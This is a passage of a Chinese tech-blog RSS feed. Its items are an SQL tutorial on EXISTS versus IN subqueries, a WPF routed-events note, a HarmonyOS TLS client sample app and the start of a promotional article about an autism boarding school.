      <description>首页编程日记开发工具嵌入式服务器运维oracle中的exists 和not exists 用法news/2025/10/31 23:18:34/exists （sql 返回结果集为真）not exists (sql 不返回结果集为真）exists 与 in 意思相同，语法不同，效率高于innot exists 与 not in 意思相同，语法不同，效率高于in基本概念：select* from A where not exists(select * from B where A.id=B.id);select* from A where exists(select * from B where A.id=B.id);1、首先执行外查询select * from A，然后从外查询的数据取出一条数据传给内查询。2、内查询执行select * from B，外查询传入的数据和内查询获得的数据根据where后面的条件做匹对，如果存在数据满足A.id=B.id则返回true，如果一条都不满足则返回false。3、内查询返回true，则外查询的这行数据保留，反之内查询返回false，则外查询的这行数据不显示。外查询的所有数据逐行查询匹对。注意：exists或not exists的执行顺序是先执行外查询再执行内查询。这和我们学的子查询概念冲突。举例如下：表AID NAME1 A12 A23 A3表BID AID NAME1 1 B12 2 B23 2 B3表A和表B是１对多的关系 A.ID =&gt; B.AIDSELECT ID,NAME FROM A WHERE EXIST(SELECT * FROM B WHERE A.ID=B.AID)执行结果为1 A12 A2原因可以按照如下分析SELECT ID,NAME FROM A WHERE EXISTS(SELECT * FROM B WHERE B.AID=１)---&gt;SELECT * FROM B WHERE B.AID=１有值返回真所以有数据 SELECT ID,NAME FROM A WHERE EXISTS(SELECT * FROM B WHERE B.AID=2)---&gt;SELECT * FROM B WHERE B.AID=２有值返回真所以有数据 SELECT ID,NAME FROM A WHERE EXISTS(SELECT * FROM B WHERE B.AID=3)---&gt;SELECT * FROM B WHERE B.AID=３无值返回真所以没有数据NOT EXISTS 就是反过来SELECT ID,NAME FROM A WHERE　NOT EXIST (SELECT * FROM B WHERE A.ID=B.AID)执行结果为 3 A===========================================================================EXISTS=IN,意思相同不过语法上有点点区别，好像使用IN效率要差点，应该是不会执行索引的原因 
SELECT ID,NAME FROM A　 WHERE　ID IN(SELECT AID FROM B)NOT EXISTS=NOT IN ,意思相同不过语法上有点点区别 
SELECT ID,NAME FROM A WHERE　ID　NOT IN(SELECT AID FROM B)下面是普通的用法：SQL中IN,NOT IN,EXISTS,NOT EXISTS的用法和差别:IN:确定给定的值是否与子查询或列表中的值相匹配。IN 关键字使您得以选择与列表中的任意一个值匹配的行。当要获得居住在 California、Indiana 或 Maryland 州的所有作者的姓名和州的列表时，就需要下列查询：SELECT ProductID, ProductName FROM Northwind.dbo.Products WHERE CategoryID=1ORCategoryID=4OR CategoryID=5然而，如果使用 IN，少键入一些字符也可以得到同样的结果：SELECT ProductID, ProductName FROM Northwind.dbo.Products WHERE CategoryID IN(1,4,5)IN 关键字之后的项目必须用逗号隔开，并且括在括号中。下列查询在 titleauthor 表中查找在任一种书中得到的版税少于 50% 的所有作者的 au_id，然后从 authors 表中选择 au_id 与titleauthor 查询结果匹配的所有作者的姓名：SELECT au_lname, au_fname FROM authors WHERE au_id IN(SELECT au_id FROM titleauthor WHEREroyaltyper&lt;50)结果显示有一些作者属于少于 50% 的一类。NOT IN:通过 NOT IN 关键字引入的子查询也返回一列零值或更多值。以下查询查找没有出版过商业书籍的出版商的名称。SELECT pub_name FROM publishers WHERE pub_id NOT IN (SELECT pub_id FROM titles WHERE type= 'business')使用 EXISTS 和 NOT EXISTS 引入的子查询可用于两种集合原理的操作：交集与差集。两个集合的交集包含同时属于两个原集合的所有元素。差集包含只属于两个集合中的第一个集合的元素。EXISTS:指定一个子查询，检测行的存在。本示例所示查询查找由位于以字母 B 开头的城市中的任一出版商出版的书名：SELECT DISTINCT pub_name FROM publishers WHERE EXISTS(SELECT * FROM titles WHEREpub_id=publishers.pub_id ANDtype='business')SELECT distinct pub_name FROM publishers WHERE pub_id IN(SELECT pub_id FROM titles WHEREtype='business')两者的区别:EXISTS:后面可以是整句的查询语句如:SELECT * FROM titlesIN:后面只能是对单列:SELECT pub_id FROM titlesNOT EXISTS:例如，要查找不出版商业书籍的出版商的名称：SELECT pub_name FROM publishers WHERE NOT EXISTS(SELECT * FROM titles WHERE pub_id=publishers.pub_id ANDtype='business')下面的查询查找已经不销售的书的名称:SELECT title FROM titles WHERE NOT EXISTS(SELECT title_id FROM sales WHERE title_id=titles.title_id)语法EXISTS subquery参数 subquery:是一个受限的 SELECT 语句 (不允许有 COMPUTE 子句和 INTO 关键字)。有关更多信息，请参见SELECT 中有关子查询的讨论。结果类型:Boolean结果值:如果子查询包含行，则返回 TRUE。示例A. 在子查询中使用 NULL 仍然返回结果集这个例子在子查询中指定 NULL，并返回结果集，通过使用 EXISTS 仍取值为 TRUE。USE Northwind 
GO 
SELECT CategoryName 
FROM Categories 
WHERE EXISTS(SELECT NULL)ORDER BY CategoryName ASC 
GOB. 比较使用 EXISTS 和 IN 的查询这个例子比较了两个语义类似的查询。第一个查询使用 EXISTS 而第二个查询使用 IN。注意两个查询返回相同的信息。USE pubs 
GO 
SELECT DISTINCT pub_name 
FROM publishers 
WHERE EXISTS(SELECT * FROM titles WHERE pub_id=publishers.pub_id ANDtype=\'business\')GO -- Or, using the IN clause: USE pubs 
GO 
SELECT distinct pub_name 
FROM publishers 
WHERE pub_id IN(SELECT pub_id FROM titles WHEREtype=\'business\')GO下面是任一查询的结果集：pub_nameAlgodata InfosystemsNew Moon BooksC.比较使用 EXISTS 和 = ANY 的查询本示例显示查找与出版商住在同一城市中的作者的两种查询方法：第一种方法使用 = ANY，第二种方法使用EXISTS。注意这两种方法返回相同的信息。USE pubs 
GO 
SELECT au_lname, au_fname 
FROM authors 
WHERE exists(SELECT * FROM publishers WHERE authors.city=publishers.city)GO -- Or, using=ANY USE pubs 
GO 
SELECT au_lname, au_fname 
FROM authors 
WHERE city=ANY(SELECT city FROM publishers)GOD.比较使用 EXISTS 和 IN 的查询本示例所示查询查找由位于以字母 B 开头的城市中的任一出版商出版的书名：USE pubs 
GO 
SELECT title 
FROM titles 
WHERE EXISTS(SELECT * FROM publishers WHERE pub_id=titles.pub_id AND city LIKE\'B%\')GO -- Or, using IN: USE pubs 
GO 
SELECT title 
FROM titles 
WHERE pub_id IN(SELECT pub_id FROM publishers WHERE city LIKE\'B%\')GOE. 使用 NOT EXISTSNOT EXISTS 的作用与 EXISTS 正相反。如果子查询没有返回行，则满足 NOT EXISTS 中的 WHERE 子句。本示例查找不出版商业书籍的出版商的名称：USE pubs 
GO 
SELECT pub_name 
FROM publishers 
WHERE NOT EXISTS(SELECT * FROM titles WHERE pub_id=publishers.pub_id ANDtype=\'business\')ORDER BY pub_name 
GOhttp://www.ppmy.cn/news/1540859.html相关文章WPF入门_03路由事件１、如何定义路由事件 
1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:34 +0000</pubDate>
    </item>
    <item>
      <title>WPF入门_03路由事件</title>
      <link>https://www.ppmy.cn/news/1540858.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维WPF入门_03路由事件news/2025/10/31 23:18:33/１、如何定义路由事件1）事件定义public static readonly RoutedEvent ClickEvent;2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEventHandler), typeof(ButtonBase));3）传统事件包装public event RoutedEventHandler Click{add{base.AddHandler(ClickEvent, value);}remove{base.RemoveHandler(ClickEvent, value);}}2、共享路由事件可以在类之间共享路由事件的定义。即实现路由事件的继承。例如UIElement类和ContentElement类都使用了MouseUp事件，但MouseUp事件是由System.Windows.Input.Mouse类定义的。UIElement类和ContentElement类只是通过RouteEvent.AddOwner方法重用了MouseUp事件_typeofThis = typeof(UIElement);MouseUpEvent = Mouse.MouseUpEvent.AddOwner(_typeofThis);3、引发和处理路由事http://www.ppmy.cn/news/1540858.html相关文章鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:33 +0000</pubDate>
    </item>
    <item>
      <title>鸿蒙网络编程系列7-TLS安全数据传输单向认证示例</title>
      <link>https://www.ppmy.cn/news/1540857.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维鸿蒙网络编程系列7-TLS安全数据传输单向认证示例news/2025/10/31 23:18:32/1.TLS简介TLS（Transport Layer Security）协议的前身是SSL（Secure Socket Layer）安全套接层协议，由Netscape公司于1994年提出，是一套网络通信安全协议。IETF（The Internet Engineering Task Force）后期负责SSL协议，并且重新命名为TLS协议。IETF于1999年发布了TLS 1.0版本，该版本基于SSL 3.0；2006年4月，发布了TLS 1.1版本，2008年8月，发布了TLS 1.2版本，2018年3月，TLS 1.3版本发布，是目前最新的TLS版本。2. TLS的常用方法鸿蒙封装的TLS操作类位于模块socket中，使用如下的方式导入：import socket from '@ohos.net.socket';socket模块包括了众多的TCP操作方法，就本文而言，重点需要掌握的是如下五个：1）constructTLSSocketInstance(): TLSSocket创建并返回一个TLSSocket对象,,在使用TLSSocket的方法以前需要创建该对象。2）bind(address: NetAddress): Promise&lt;void&gt;绑定IP地址和端口，端口可以指定或由系统随机分配，可以使用0.0.0.0表示本机IP地址；使用Promise方式作为异步方法。3）connect(options: TLSConnectOptions): Promise&lt;void&gt;连接到指定的TLS服务端，参数options包含了连接的地址address、TLS安全配置secureOptions以及ALPN协议列表ALPNProtocols，其中address和secureOptions是必选的，ALPN是可选的，使用promise方法作为异步方法。4）send(data: string): Promise&lt;void&gt;通过TLSSocket连接向服务端发送消息data，使用Promise方式作为异步方法。5）on(type: 'message', callback: Callback&lt;{message: ArrayBuffer, remoteInfo: SocketRemoteInfo}&gt;): void订阅TLSSocket连接的接收消息事件，当套接字接收到消息时触发该事件，其中message表示接收到的消息，remoteInfo是发送方信息；使用callback方式作为异步方法。3. TLS单向认证通讯示例为演示TLS安全通讯单向认证的方式（即客户端认证服务端，客户端本身不提供证书），本示例实现了使用TLS协议发送、接收消息的功能，运行后的初始界面如下所示：本示例中，可以配置TLS服务端的地址，可以直接输入服务端证书的CA信息，或者从文件加载，在配置好CA后，就可以连接服务端了，连接握手成功后，就可以发送信息给对方。下面详细介绍创建该应用的步骤。步骤1：创建Empty Ability项目。步骤2：在module.json5配置文件加上对权限的声明："requestPermissions": [{"name": "ohos.permission.INTERNET"},{"name": "ohos.permission.GET_WIFI_INFO"}]这里分别添加了访问互联网和访问WIFI信息的权限。步骤3：在Index.ets文件里添加如下的代码：import socket from '@ohos.net.socket';
import wifiManager from '@ohos.wifiManager';
import systemDateTime from '@ohos.systemDateTime';
import util from '@ohos.util';
import picker from '@ohos.file.picker';
import fs from '@ohos.file.fs';
import common from '@ohos.app.ability.common';//执行TLS通讯的对象
let tlsSocket = socket.constructTLSSocketInstance()//说明：本地的IP地址不是必须知道的，绑定时绑定到IP：0.0.0.0即可，显示本地IP地址的目的是方便对方发送信息过来
//本地IP的数值形式
let ipNum = wifiManager.getIpInfo().ipAddress
//本地IP的字符串形式
let localIp = (ipNum &gt;&gt;&gt; 24) + '.' + (ipNum &gt;&gt; 16 &amp; 0xFF) + '.' + (ipNum &gt;&gt; 8 &amp; 0xFF) + '.' + (ipNum &amp; 0xFF);let caFileUri = ''@Entry
@Component
struct Index {//连接、通讯历史记录@State msgHistory: string = ''//要发送的信息@State sendMsg: string = ''//服务端IP地址@State serverIp: string = "0.0.0.0"//服务端端口@State serverPort: number = 9999//是否可以加载@State canLoad: boolean = false//是否可以连接@State canConnect: boolean = false//是否可以发送消息@State canSend: boolean = false@State ca: string = ``scroller: Scroller = new Scroller()build() {Row() {Column() {Text("TLS通讯示例").fontSize(14).fontWeight(FontWeight.Bold).width('100%').textAlign(TextAlign.Center).padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {Text("本地IP地址：").width(100).fontSize(14).flexGrow(0)Text(localIp).width(110).fontSize(12).flexGrow(1)}.width('100%').padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {Text("服务端地址：").fontSize(14).width(90).flexGrow(1)TextInput({ text: this.serverIp }).onChange((value) =&gt; {this.serverIp = value}).width(110).fontSize(12).flexGrow(4)Text(":").width(5).flexGrow(0)TextInput({ text: this.serverPort.toString() }).type(InputType.Number).onChange((value) =&gt; {this.serverPort = parseInt(value)}).fontSize(12).flexGrow(2).width(50)}.width('100%').padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {Text("CA(输入或者加载)").fontSize(14).width(90).flexGrow(1)Button("选择").onClick(() =&gt; {this.selectCA()}).width(70).fontSize(14).flexGrow(0)Button("加载").onClick(() =&gt; {this.loadCA()}).enabled(this.canLoad).width(70).fontSize(14).flexGrow(0)Button("连接").onClick(() =&gt; {this.connect2Server()}).enabled(this.canConnect).width(70).fontSize(14).flexGrow(0)}.width('100%').padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {TextArea({ text: this.ca }).onChange((value) =&gt; {this.ca = value}).flexGrow(1).height(200)}.width('100%').padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {TextInput({ placeholder: "输入要发送的消息" }).onChange((value) =&gt; {this.sendMsg = value}).width(200).flexGrow(1)Button("发送").enabled(this.canSend).width(70).fontSize(14).flexGrow(0).onClick(() =&gt; {this.sendMsg2Server()})}.width('100%').padding(10)Scroll(this.scroller) {Text(this.msgHistory).textAlign(TextAlign.Start).padding(10).width('100%').backgroundColor(0xeeeeee)}.align(Alignment.Top).backgroundColor(0xeeeeee).height(300).flexGrow(1).scrollable(ScrollDirection.Vertical).scrollBar(BarState.On).scrollBarWidth(20)}.width('100%').justifyContent(FlexAlign.Start).height('100%')}.height('100%')}//发送消息到服务端sendMsg2Server() {tlsSocket.send(this.sendMsg + "\r\n").then(async () =&gt; {this.msgHistory += "我:" + this.sendMsg + await getCurrentTimeString() + "\r\n"}).catch((e) =&gt; {this.msgHistory += '发送失败' + e.message + "\r\n";})}//绑定本地地址async bind2LocalAddress() {//本地地址let localAddress = { address: "0.0.0.0", family: 1 }await tlsSocket.bind(localAddress).then(() =&gt; {this.msgHistory = 'bind success' + "\r\n";}).catch((e) =&gt; {this.msgHistory = 'bind fail ' + e.message + "\r\n";})//收到消息时的处理tlsSocket.off("message")tlsSocket.on("message", async (value) =&gt; {let msg = buf2String(value.message)let time = await getCurrentTimeString()this.msgHistory += "服务端:" + msg + time + "\r\n"this.scroller.scrollEdge(Edge.Bottom)})}//选择CA证书文件selectCA() {let documentPicker = new picker.DocumentViewPicker();documentPicker.select().then((result) =&gt; {if (result.length &gt; 0) {caFileUri = result[0]this.msgHistory += "select file: " + caFileUri + "\r\n";this.canLoad = true}}).catch((e) =&gt; {this.msgHistory += 'DocumentViewPicker.select failed ' + e.message + "\r\n";});}//加载CA文件内容loadCA() {try {let buf = new ArrayBuffer(1024 * 4);let file = fs.openSync(caFileUri, fs.OpenMode.READ_ONLY);let readLen = fs.readSync(file.fd, buf, { offset: 0 });this.ca = buf2String(buf.slice(0, readLen))this.canConnect = truefs.closeSync(file);}catch (e) {this.msgHistory += 'readText failed ' + e.message + "\r\n";}}//连接服务端connect2Server() {//绑定本地地址this.bind2LocalAddress()//服务端地址let serverAddress = { address: this.serverIp, port: this.serverPort, family: 1 }let opt: socket.TLSSecureOptions = {ca: [this.ca]}tlsSocket.connect({ address: serverAddress, secureOptions: opt }).then(() =&gt; {this.msgHistory = 'connect success ' + "\r\n";this.canSend = true}).catch((e) =&gt; {this.msgHistory = 'connect fail ' + e.message + "\r\n";})}
}//同步获取当前时间的字符串形式
async function getCurrentTimeString() {let time = ""await systemDateTime.getDate().then((date) =&gt; {time = date.getHours().toString() + ":" + date.getMinutes().toString()+ ":" + date.getSeconds().toString()})return "[" + time + "]"
}//ArrayBuffer转utf8字符串
function buf2String(buf: ArrayBuffer) {let msgArray = new Uint8Array(buf);let textDecoder = util.TextDecoder.create("utf-8");return textDecoder.decodeWithStream(msgArray)
}步骤4：编译运行，可以使用模拟器或者真机。步骤5：配置CA信息，单击“选择”按钮选择CA证书，如图所示：步骤6：单击“加载”按钮加载CA证书，如图所示：步骤7：配置服务端地址，当前，前提是要运行一个TLS服务端，具体的服务端可以使用别的语言编写，或者使用更高版本的鸿蒙API编写，本例假定使用一个基于TLS的回声服务器，配置好后，单击“连接”按钮即可开始连接服务端。连接成功后，如果在服务端监听，可以看到如下的连接过程信息：步骤8：输入要发送的信息，单击“发送”按钮即可发送信息到服务端，如下图所示：如果监听发送接收消息，可以看到Application Data的发送过程：通过上面的过程可知，在经过成功的握手后，消息发送接收都是基于密文的，达到了保密的目的。这样就完成了一个简单的TLS单向认证消息发送应用。（本文作者原创，除非明确授权禁止转载）本文码云源码地址： https://gitee.com/zl3624/harmonyos_network_samples/tree/master/code/tls/TlsDemo本系列码云源码地址：https://gitee.com/zl3624/harmonyos_network_sampleshttp://www.ppmy.cn/news/1540857.html相关文章汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:32 +0000</pubDate>
    </item>
    <item>
      <title>汕头市自闭症全托管学校，为孩子打开未来大门</title>
      <link>https://www.ppmy.cn/news/1540856.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维汕头市自闭症全托管学校，为孩子打开未来大门news/2025/10/31 23:18:31/原文指路：http://www.zibizhengwang.com/page33.html在探索自闭症儿童教育的广阔领域里，全托管学校以其独特的优势，为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践，无疑为我们提供了一个宝贵的参考框架，而广州的星贝育园自闭症儿童寄宿制学校，则以其卓越的教育理念和成效，成为了这一领域的佼佼者，为自闭症儿童打开了通往未来的大门。星贝育园，坐落于广州这座充满活力的城市之中，却以其宁静、温馨的氛围，为自闭症儿童营造了一个远离喧嚣、充满爱与希望的避风港。这里，不仅是一所学校，更是一个家，一个让自闭症儿童能够自由探索、快乐成长的地方。星贝育园的核心竞争力，在于其专业且富有爱心的教育团队。这支团队由经验丰富的特殊教育专家、心理咨询师、职业治疗师以及生活辅导老师组成，他们不仅具备深厚的专业知识，更对自闭症儿童有着深刻的理解和无限的耐心。在星贝育园，每个孩子都是独一无二的，他们的兴趣、能力、性格以及学习风格都得到了充分的尊重与关注。教育团队根据每个孩子的具体情况，量身定制教育计划，确保每个孩子都能在适合自己的节奏和方式下学习，实现全面发展。在星贝育园，教育不仅仅是知识的传授，更是一种情感的交流、心灵的触碰。学校通过一系列精心设计的课程和活动，旨在培养孩子们的语言沟通能力、社交技能、自我管理能力以及解决问题的能力。这些课程和活动既注重理论知识的灌输，又强调实践操作和情感体验，让孩子们在轻松愉快的氛围中学习，体验成功的乐趣。例如，学校会组织角色扮演游戏，让孩子们在模拟的情境中学习如何与人交流、合作与分享；还会开展科学实